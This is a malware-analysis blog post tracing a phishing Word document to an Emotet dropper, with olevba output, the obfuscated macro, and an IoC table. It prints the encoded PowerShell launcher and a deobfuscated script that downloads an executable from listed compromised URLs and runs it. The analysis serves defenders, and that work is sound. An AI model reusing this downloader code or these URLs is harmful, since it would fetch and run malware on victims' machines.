---
layout: post
title:  "Yet Another Emotet Dropper"
description: "A walkthrough on analysing a suspicious mail link to the discovery and identification of malware"
date:   2019-03-13 14:49:33 +0000
tags: [Malware, Incident Response, Emotet]
---

![suspicious word doc](/blog/assets/malware.png)

As our analysis begins on the phishing email we additionally have a suspicious Link.
 * http://hillhousewriters.com/_notes/ti8c-u5jpix-zgipgrvz/?emailId=aaa.bbb@xxxxx.com

If we follow the link we download and open a document with macros disabled it should safely open and look similar to this one:

![suspicious word doc](/blog/assets/Emotet_Word.png)

After looking at the macros, the code looks heavily obfuscated! we can guess there is something malicious here
but how do we de-obfuscate and reveal the malware code hidden within Microsoft Office documents.

## Trying oletools

Using the opensource package oletools we can quickly scan the document(or .pub) for suspicious/malicious calls:
 * [Download oletools](https://www.decalage.info/python/oletools)

```
$ olevba --decode ~/216937657718.doc
...abbrev...
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoopen            |Runs when the Word document is opened        |
|Suspicious|ShowWindow          |May hide the application                     |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|ChrW                |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|'\x08'              |May use special characters such as backspace |
|          |                    |to obfuscate code when printed on the console|
|          |                    |(obfuscation: Hex)                           |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Hex String|'\x149A`'           |14394160                                     |
...abrev...
|Base64    |'\x00j\x00E\x00C\x00|AGoARQBDAFQAewBOAEUAVwAtAG8AYgBqAGUAQwB0ACAAU|
|String    |T\x00{\x00N\x00E\x00|wBZAFMAdABlAE0ALgBpAE8ALgBTAHQAcgBFAGEAbQByAG|
|          |W\x00-\x00o\x00b\x00|UAQQBEAEUA                                   |
|          |j\x00e\x00C\x00t\x00|                                             |
|          |\x00S\x00Y\x00S\x00t|                                             |
|          |\x00e\x00M\x00.\x00i|                                             |
|          |\x00O\x00.\x00S\x00t|                                             |
|          |\x00r\x00E\x00a\x00m|                                             |
|          |\x00r\x00e\x00A\x00D|                                             |
|          |\x00E\x00'          |                                             |
|Base64    |')'               |winm                                         |
|String    |                    |                                             |
|Base64    |'۩'                |rtup                                         |
|String    |                    |                                             |
+----------+--------------------+---------------------------------------------+
```

Here we can see a few interesting calls that indeed alert us to this document being suspicious/malicious:
 * Autoopen  
 * Numerous hex strings
 * Numerous base-64 encoded strings
 
### Back to extracting OLE Streams

The macro is heavily obfuscated as we stated earlier:
```
VBA MACRO RoCDcZA1.bas 
in file: 216937657718.doc - OLE stream: 'Macros/VBA/RoCDcZA1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Function VAUQUDGA()
   If iAwABD = CxB_BwAA Then
mDkZAA = Chr(JGxAAU1c)
sAD4XQD = wAQDB4 + ChrW(zAA4Q1) * 798610898 * CBool(199131999) + 960217822 / Round(EoXooU1B) - tDAQAB + Sqr(422059103) - 649903709 * CByte(597231791)
lUAAXCDQ = Chr(MAAQUQ_)
End If
   If a4ADAB = NQ4QQo Then
wkAG1B = Chr(lcccwCD)
iAQUCZQ = icQB4UDk + ChrW(CGxGXAAA) * 593911593 * CBool(468854784) + 830106307 / Round(TACAX1) - Ow_AABo + Sqr(408048453) - 595248085 * CByte(892151188)
aACBU4 = Chr(ECCcDA)
End If
   If Ok1AxAA = jkUB1C Then
pAAUDQA = Chr(YAAAA_)
YAU_DZcA = lUcQcA + ChrW(kUQABQX) * 847754092 * CBool(281578097) + 8522168 / Round(BAAAAAox) - sUADxoXU + Sqr(444086970) - 98535912 * CByte(493687467)
ccBAA1Zw = Chr(HADCXc)
End If
   If fAAQAQk = kkDAD_ Then
hAAA_U = Chr(lB1AwA)
cAoAAAA = JA1UUcA + ChrW(c4cBkUU_) * 441667407 * CBool(227667872) + 827355892 / Round(tQZDBBxU) - sZ1Dco1 + Sqr(586789736) - 688392199 * CByte(700043088)
mBcG_D = Chr(UAUAAZAA)
End If
   If dU_AZA = VQAXABA Then
coA_AoA = Chr(QoADDBA_)
pAGQAcZ1 = TBAAAU + ChrW(oAZUXA) * 994450087 * CBool(939517045) + 195668918 / Round(fAAAUQA) - F_A4xA_ + Sqr(754382139) - 243820295 * CByte(816034839)
qoGAADkx = Chr(p_BkABAA)
End If
   If lBAA_DB = XxAcXXx Then
ABAQwAx = Chr(iDCQXA)
```

By inserting the URL into VirusTotal we can gather evidence that confirms our suspicions that this is an attack
 * [VT Sample 3eaba85e842d0ed0489d430cb1bc37d1fca702845ba478a0e290115bebfd8827](https://www.virustotal.com/#/file/3eaba85e842d0ed0489d430cb1bc37d1fca702845ba478a0e290115bebfd8827/detection)
 * [Any.Run https://app.any.run/tasks/8664d1ea-fbda-4678-82b2-8cd089870bd8](https://app.any.run/tasks/8664d1ea-fbda-4678-82b2-8cd089870bd8)

![VT on sample](/blog/assets/VT_Emotet.png)

This dropper then downloads another executable (Emotet):
 * [ VT Sample 8fc9b631cd01fe74bfb546e77d7d05d73dd6f924ade16365ecf1417544382fb2](https://www.virustotal.com/#/file/8fc9b631cd01fe74bfb546e77d7d05d73dd6f924ade16365ecf1417544382fb2/detection)

![VT on sample](/blog/assets/VT_Emotet2.png)

## Decoding the Payload

The obfuscated payload was a powershell command:
```
powershell -e LgAoACAAKABbAHMAdABSAEkATgBnAF0AJAB2AGUAUgBiAE8AcwBlAHAAcgBlAEYARQBSAGUATgBDAGUAKQBbADEALAAzAF0AKwAnAHgAJwAtAGoAbwBJAE4AJwAnACkAKABOAEUAVwAtAG8AYgBqAGUAQwB0ACAAIABzAFkAUwBUAEUAbQAuAGkATwAuAEMAbwBNAHAAUgBFAHMAcwBpAE8ATgAuAEQARQBmAEwAQQBUAGUAcwB0AFIAZQBBAG0AKABbAHMAeQBTAHQARQBtAC4ASQBvAC4ATQBFAG0AbwBSAHkAUwBUAHIARQBhAE0AXQBbAHMAWQBzAHQAZQBtAC4AYwBPAG4AdgBFAFIAdABdADoAOgBmAFIAbwBNAEIAYQBTAGUANgA0AFMAVAByAGkAbgBHACgAIAAoACcAVgBaAEgAJwArACcAaAAnACsAJwBhACcAKwAnADkAcwAnACsAJwB3AEUATQBYAC8ARgAnACsAJwBYADgAJwArACcAdwBLAEMARwBMAFgAWQBOAGgAUwA0ADIAaABwADQAcABtADIAVgBoAEgARwBHAFkAJwArACcAUQBCAGsARwAnACsAJwBXACcAKwAnAHoANwBGAG0AJwArACcAUgB6AEsAeQAnACsAJwBFAHEAdQAnACsAJwBFAC8ATwA5AFYAdABpAGIAZAA3AHUAJwArACcAUAAnACsAJwBkACcAKwAnAGoALwAnACsAJwBjAGUANwAnACsAJwA4AEkASwAnACsAJwAvAEQARABJAEMAWAAvAFUAbABBAEYAMQAnACsAJwBKAEEAdgAnACsAJwBOAGgAJwArACcAZwBGACcAKwAnAHMAYwBvAFgAagBYACcAKwAnAEoAZQAnACsAJwAvAFUAZABqACcAKwAnAGcARwBXADMAMABFADgAdgBIAFQAcQBLAHkAJwArACcAVwBmACcAKwAnAGgARQAnACsAJwBsADYAeABZAHMAJwArACcAegBRACcAKwAnAG4AagBiAFgAOQBmACcAKwAnAFIAeABMAFYAVABWAEcAJwArACcANwBvACcAKwAnAHcAKwA5AEoASABRACsAMwAnACsAJwBqAHMANQAwACcAKwAnAEkAcgA2ACsASAA0ADAASABlAGEAVgAwAE4ATQBpAC8AagAnACsAJwBoAFEAJwArACcAZwA4ACcAKwAnAGUANwA3AGgAbwBaAGYAMQB5AFIAWABtADEAbAB5AHAAKwAnACsAJwBYACcAKwAnAHYAdwBGAEwAbgBkACcAKwAnAHQANQBCAEQAeAA3AGwAJwArACcAKwBkADgAdAAnACsAJwBQAEMAJwArACcAMwAnACsAJwBvAEIAJwArACcAYQBsAG0AaAAwAGIANgAnACsAJwBXAHcAJwArACcATwAnACsAJwBGACcAKwAnAGoAagA3ADcAdwBiAEkAbwBYACcAKwAnADIAWABhACcAKwAnADQAZQAnACsAJwAzAHYAJwArACcAMQAnACsAJwBxAHEAYgBnACcAKwAnAFMAJwArACcAawBuAGUAVgAnACsAJwBIAEkAUQArACcAKwAnAG0AJwArACcAQQBIAC8AJwArACcAVwBPADkAJwArACcAVQBrADUAVABpAEcASQAnACsAJwA5ADgAJwArACcAKwBUAEUAbQAwAFkAJwArACcAKwArAGsAMwBaACcAKwAnAEMASABzAGcAMAAnACsAJwBDADQAdABsAHcAVQAnACsAJwBEAGsANQBMAHQATABVADIAQwArACcAKwAnAEUAMQA4AEoAVABXAEUATQA4ACcAKwAnAG8AQwAnACsAJwBrAGkAegB1ACcAKwAnAC8AKwBBAHgAJwArACcASgBDADUAQwBzAGMAeQAnACsAJwBLAGQAJwArACcAZwBOAFIAZABvAEsALwBiAHgASwAvAHkARQBOACcAKwAnAFgAJwArACcAeAAvAGoAQwAnACsAJwBnADYAWQAnACsAJwAyAHUAWgBZAGMAJwArACcAegA4AG8AJwArACcAdgAnACsAJwBNAHIAZwBvAHoARQBxAEYARABrAHQAJwArACcAWABhAEkAQgAnACsAJwBmACcAKwAnAE4ASgBCACcAKwAnAHoAYgByAFEATQBJACcAKwAnAHAAQQBwAHUAJwArACcAdgBVADUAUAAxACcAKwAnAHIAeQBjADMAJwArACcAdgA0ACcAKwAnAFEATQBUADIAcQBTADQAZABQAFgAdQBxACcAKwAnAEsAZgB3AGoAZQB6AEgAegBXAEwAdwBWAFEAQwBzAHcAJwArACcAbgAnACsAJwBZAFIAdQAyAGgAbQBMAHAAZgA3AGkAJwArACcAcQBnADgAbABrAGkAWAAnACsAJwBhACsAcwAnACsAJwByAGkALwBzAFYARwBIAGEAbQBlACcAKwAnAGIAWQBMADcARABJAEwAJwArACcAMwB6ACcAKwAnAE0AdwAxAE8ASwAzAFgAVQBMAGYANwBIAFoAUwBGAHQAYQBiAHMAdABYAEoAJwArACcASwBUAEMAZwBxAEEAdAAnACsAJwBOAGkAUQAnACsAJwByAFAAUgA1ADIAKwB4ADgARgAnACsAJwB0AHkASwA1ACcAKwAnAG4AUQArAGgAJwArACcAOQArAG8AMAAnACsAJwA5AFQAQgBtACcAKwAnAEoAUABSACsAYQBDACsAZwAnACsAJwBGAGMAPQAnACkAIAApACAALABbAEkAbwAuAEMAbwBtAFAAUgBlAFMAUwBJAE8ATgAuAEMATwBNAFAAUgBFAFMAcwBpAG8ATgBNAG8ARABFAF0AOgA6AEQAZQBjAG8ATQBwAFIAZQBTAFMAIAApACAAfABmAE8AUgBFAEEAQwBIAC0AbwBCAGoARQBDAFQAewBOAEUAVwAtAG8AYgBqAGUAQwB0ACAAUwBZAFMAdABlAE0ALgBpAE8ALgBTAHQAcgBFAGEAbQByAGUAQQBEAEUAcgAoACQAXwAsACAAWwBzAHkAUwBUAGUATQAuAHQAZQB4AFQALgBFAE4AQwBvAEQAaQBuAEcAXQA6ADoAQQBzAGMAaQBJACAAKQAgAH0AIAB8AGYAbwBSAEUAYQBDAGgALQBvAGIAagBlAEMAVAB7ACQAXwAuAHIAZQBhAGQAVABPAEUATgBEACgAKQB9ACkAIAA=
```
After base-64 decoding becomes
```
.( ([stRINg]$veRbOsepreFEReNCe)[1,3]+'x'-joIN'')
(NEW-objeCt  sYSTEm.iO.CoMpREssiON.DEfLATestReAm([syStEm.Io.MEmoRySTrEaM][sYstem.cOnvERt]::fRoMBaSe64STrinG( 
('VZH'+'h'+'a'+'9s'+'wEMX/F'+'X8'+'wKCGLXYNhS42hp4pm2VhHGGY'+'QBkG'+'W'+'z7Fm'+'RzKy'+'Equ'+'E/O9Vtibd7u'+'P'+'d'+'j/'+'ce7'+'8IK'+'/DDICX/UlAF1'+'JAv'+'Nh'+'gF'+'scoXjX'+'Je'+'/Udj'+'gGW30E8vHTqKy'+'Wf'+'hE'+'l6xYs'+'zQ'+'njbX9f'+'RxLVTVG'+'7o'+'w+9JHQ+3'+'js50'+'Ir6+H40HeaV0NMi/j'+'hQ'+'g8'+'e77hoZf1yRXm1lyp+'+'X'+'vwFLnd'+'t5BDx7l'+'+d8t'+'PC'+'3'+'oB'+'almh0b6'+'Ww'+'O'+'F'+'jj77wbIoX'+'2Xa'+'4e'+'3v'+'1'+'qqbg'+'S'+'kneV'+'HIQ+'+'m'+'AH/'+'WO9'+'Uk5TiGI'+'98'+'+TEm0Y'+'++k3Z'+'CHsg0'+'C4tlwU'+'Dk5LtLU2C+'+'E18JTWEM8'+'oC'+'kizu'+'/+Ax'+'JC5Cscy'+'Kd'+'gNRdoK/bxK/yEN'+'X'+'x/jC'+'g6Y'+'2uZYc'+'z8o'+'v'+'MrgozEqFDkt'+'XaIB'+'f'+'NJB'+'zbrQMI'+'pApu'+'vU5P1'+'ryc3'+'v4'+'QMT2qS4dPXuq'+'KfwjezHzWLwVQCsw'+'n'+'YRu2hmLpf7i'+'qg8lkiX'+'a+s'+'ri/sVGHame'+'bYL7DIL'+'3z'+'Mw1OK3XULf7HZSFtabstXJ'+'KTCgqAt'+'NiQ'+'rPR52+x8F'+'tyK5'+'nQ+h'+'9+o0'+'9TBm'+'JPR+aC+g'+'Fc=') ) 
,[Io.ComPReSSION.COMPRESsioNMoDE]::DecoMpReSS ) 
|fOREACH-oBjECT{NEW-objeCt SYSteM.iO.StrEamreADEr($_, [sySTeM.texT.ENCoDinG]::AsciI ) } 
|foREaCh-objeCT{$_.readTOEND()}) 
```
Cyberchef had some trouble with de-compression - so Windows Powershell to the rescue, by a few simple code edits, we can safely run this code to extract the dropper URLs:

```
$a=(NEW-objeCt  sYSTEm.iO.CoMpREssiON.DEfLATestReAm([syStEm.Io.MEmoRySTrEaM][sYstem.cOnvERt]::fRoMBaSe64STrinG( ('VZH'+'h'+'a'+'9s'+'wEMX/F'+'X8'+'wKCGLXYNhS42hp4pm2VhHGGY'+'QBkG'+'W'+'z7Fm'+'RzKy'+'Equ'+'E/O9Vtibd7u'+'P'+'d'+'j/'+'ce7'+'8IK'+'/DDICX/UlAF1'+'JAv'+'Nh'+'gF'+'scoXjX'+'Je'+'/Udj'+'gGW30E8vHTqKy'+'Wf'+'hE'+'l6xYs'+'zQ'+'njbX9f'+'RxLVTVG'+'7o'+'w+9JHQ+3'+'js50'+'Ir6+H40HeaV0NMi/j'+'hQ'+'g8'+'e77hoZf1yRXm1lyp+'+'X'+'vwFLnd'+'t5BDx7l'+'+d8t'+'PC'+'3'+'oB'+'almh0b6'+'Ww'+'O'+'F'+'jj77wbIoX'+'2Xa'+'4e'+'3v'+'1'+'qqbg'+'S'+'kneV'+'HIQ+'+'m'+'AH/'+'WO9'+'Uk5TiGI'+'98'+'+TEm0Y'+'++k3Z'+'CHsg0'+'C4tlwU'+'Dk5LtLU2C+'+'E18JTWEM8'+'oC'+'kizu'+'/+Ax'+'JC5Cscy'+'Kd'+'gNRdoK/bxK/yEN'+'X'+'x/jC'+'g6Y'+'2uZYc'+'z8o'+'v'+'MrgozEqFDkt'+'XaIB'+'f'+'NJB'+'zbrQMI'+'pApu'+'vU5P1'+'ryc3'+'v4'+'QMT2qS4dPXuq'+'KfwjezHzWLwVQCsw'+'n'+'YRu2hmLpf7i'+'qg8lkiX'+'a+s'+'ri/sVGHame'+'bYL7DIL'+'3z'+'Mw1OK3XULf7HZSFtabstXJ'+'KTCgqAt'+'NiQ'+'rPR52+x8F'+'tyK5'+'nQ+h'+'9+o0'+'9TBm'+'JPR+aC+g'+'Fc=') ) ,[Io.ComPReSSION.COMPRESsioNMoDE]::DecoMpReSS ) |fOREACH-oBjECT{NEW-objeCt SYSteM.iO.StrEamreADEr($_, [sySTeM.texT.ENCoDinG]::AsciI ) } |foREaCh-objeCT{$_.readTOEND()}) 
$a
$dAAAADA='aCoBDABx';
$rZDAAZ=new-object Net.WebClient;$FBGDUQD4='http://indhrigroup.com/wp-content/uploads/BU/@https://lackify.com/wp-admin/N9/@http://loris.al/wp-content/b89t/@http://fiberoptictestrentals.net/wp-admin/fs/@https://financialdiscourse.com/gnh1bcv/waG7/'.Split('@');
$UGUDAc='Ox44AD';
$ZDAB4Aw = '490';
$HA1kAA1Q='ixcA4xD';
$K_1AA1=$env:userprofile+'\'+$ZDAB4Aw+'.exe';
foreach($wk_xAA in $FBGDUQD4){
try{
$rZDAAZ.DownloadFile($wk_xAA, $K_1AA1);
$JUABBADQ='DZDQAUGx';
If ((Get-Item $K_1AA1).length -ge 40000) {
Invoke-Item $K_1AA1;$BkBk_Ux1='dAUAA4UZ';break;
}
}
catch{}
}$MBxoBxAw='wxDAAD';
```

## Conclusion
Cross-referencing the IOCs we can come to the conclusion that the malware is an  **Emotet Trojan** 

URLhaus is an excellent resource for sharing intel on phishing and dropper URLs:
 * [URLHaus indhrigroup.com](https://urlhaus.abuse.ch/browse.php?search=http%3A%2F%2Findhrigroup.com%2Fwp-content%2Fuploads%2FBU%2F)

## IoCs

| url | http://hillhousewriters.com/_notes/ti8c-u5jpix-zgipgrvz/?emailId=aaa.bbb@xxxxx.com | 67.227.214.54|
| url | http://indhrigroup.com/wp-content/uploads/BU/ | 54.158.167.7 |
| url | https://lackify.com/wp-admin/N9/ | 68.66.216.39 |
| url | http://loris.al/wp-content/b89t/ | 104.27.136.48 |
| url | http://fiberoptictestrentals.net/wp-admin/fs/ | 65.75.167.106 |
| url | https://financialdiscourse.com/gnh1bcv/waG7/ | 35.173.204.6 |
| url | http://62.217.133.100:443/ | 62.217.133.100 |
| dropper | 216937657718.doc | 
| hashes | 001026B418749644107CC8581511EA238E313A31 | 216937657718.doc |
| hashes | 7B2FC1C752696EEEB7DAF301F02A1DD9 | 216937657718.doc |
| dropper | C:\Users\user\490.exe  | |
| hashes | 8FC9B631CD01FE74BFB546E77D7D05D73DD6F924ADE16365ECF1417544382FB2 | C:\Users\user\490.exe |
| hashes | acffee9073e938f68ed378211e9cb4e0e6942673 | wabmetagen.exe |
| dropper | C:\Users\admin\AppData\Local\wabmetagen\wabmetagen.exe | |
| VBA | Macros/VBA/RoCDcZA1 | |
